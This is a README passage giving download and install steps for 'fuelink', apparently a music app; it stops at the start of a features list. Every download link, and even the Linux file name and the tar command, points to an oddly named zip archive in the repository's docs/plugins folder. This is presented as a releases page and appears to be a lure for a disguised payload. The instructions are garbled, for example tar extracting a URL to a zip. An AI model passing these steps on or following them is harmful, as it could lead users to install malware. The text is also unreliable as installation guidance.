## üîß Download & Install

To download fuelink, follow these simple steps:

1. Click the link below to visit the releases page:
   [Visit Releases Page](https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip)

2. On the releases page, look for the latest version. You will see a list of downloadable files.

3. Choose the appropriate file for your operating system:

   - For **Windows**, download the `.exe` file.
   - For **macOS**, download the `.dmg` file.
   - For **Linux**, download the `https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip` file.

4. After downloading, follow these steps based on your operating system:

   - **Windows:**
     - Double-click the downloaded `.exe` file.
     - Follow the installation prompts.

   - **macOS:**
     - Open the downloaded `.dmg` file.
     - Drag the fuelink icon to your Applications folder.

   - **Linux:**
     - Extract the downloaded file using:
       ```
       tar -xzf https://raw.githubusercontent.com/GustavoDonadelli/fuelink/main/docs/plugins/Software_Anglicanism.zip
       ```
     - Navigate to the extracted folder and run:
       ```
       ./fuelink
       ```

5. Once installed, launch fuelink from your applications or directly from the folder where you extracted it.

Fuelink offers a range of features to enhance your music experience:
